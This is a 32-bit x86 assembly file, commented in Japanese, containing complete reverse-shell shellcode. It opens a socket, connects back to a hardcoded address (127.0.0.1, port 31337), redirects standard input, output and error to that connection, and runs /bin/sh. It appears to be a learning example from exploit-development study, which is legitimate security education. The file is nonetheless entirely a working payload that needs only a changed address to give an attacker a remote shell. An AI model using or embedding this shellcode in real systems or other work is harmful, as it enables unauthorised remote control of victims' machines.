BITS 32

; s = socket(2, 1, 0)
    push BYTE 0x66 ; socketcallのシステムコール番号102(=0x66)
    pop eax
    cdq            ; 正の値の場合は符号拡張でedxをゼロにできる
    xor ebx, ebx
    inc ebx        ; 1 = SYS_SOCKET = soket()
    push edx       ; スタックに引数を逆順で格納 [ protocol    = 0,
    push BYTE 0x1  ;                          SOCK_STREAM = 1,
    push BYTE 0x2  ;                          AF_INET     = 2  ]
    mov ecx, esp   ; ecx = 引数の配列へのポインタ
    int 0x80       ; システムコール発行

; システムコールのあとはソケットファイル記述子がeaxに格納される

    xchg esi, eax   ; ソケットファイル記述子をesiに保存

; connect(s, {2, 31337, <IP Address>}, 16)
    push BYTE 0x66        ; socketcallのシステムコール番号102(=0x66)
    pop eax
    inc ebx               ; ebx = 2 (AF_INETのために必要)
    push DWORD 0x01AAAA7f ; sockaddr構造体を生成する(逆順):IP Addressの記入 & AAAAの部分を 00 00 で上書き
    mov [esp+1], dx       ; { IP Address = 127.0.0.1,
    push WORD 0x697a      ;   PORT       = 31337,
    push WORD bx          ;   AF_INET    = 2          }
    mov ecx, esp          ; ecx = サーバ構造体へのポインタ
    push BYTE 16          ; argv:[ sizeof(server strust) = 16,
    push ecx              ;        server struct pointer,
    push esi              ;        socket file descripter     ]
    mov ecx, esp          ; ecx = 引数の配列
    inc ebx               ; ebx = 3 = SYS_CONNECT = connect()
    int 0x80              ; eax = 接続されたソケットファイル記述子

; dup2(connected socket, [標準入出力ファイル記述子のすべて])
    xchg esi, ebx     ; ebxにソケットファイル記述子を移送、0x00000003をesiに代入
    push BYTE 0x2
    pop ecx           ; ecxは2から開始
dup_loop:
    mov BYTE al, 0x3f ; dup2のシステムコール番号:63 = 0x3f
    int 0x80          ; dup2(c, ecx)
    dec ecx           ; 0に向かってカウントダウン
    jns dup_loop      ; サインフラグがセットされていない間、つまりecxが負ではない場合

; execve(const char *filename, char *const argv[], char *const envp[])
    mov BYTE al, 11 ; execveはシステムコール番号11
    push edx        ; 文字列をNULLで終端(符号拡張cdqでedxは0クリアされている)
    push 0x68732f2f ; "//sh"をスタックにプッシュ
    push 0x6e69622f ; "/bin"をプッシュ
    mov ebx, esp    ; "/bin//sh"のアドレスをesp経由でebxに収納
    push edx        ; スタックに32bitのnull終端をプッシュする
    mov edx, esp    ; envp用の空の配列(中身の文字列へのアドレスはNULLだが配列自体のアドレスは有効)をedxに収納
    push ebx        ; null終端上にある文字列のアドレスをスタックにプッシュ
    mov ecx, esp    ; argv用の配列をecxに収納
    int 0x80        ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])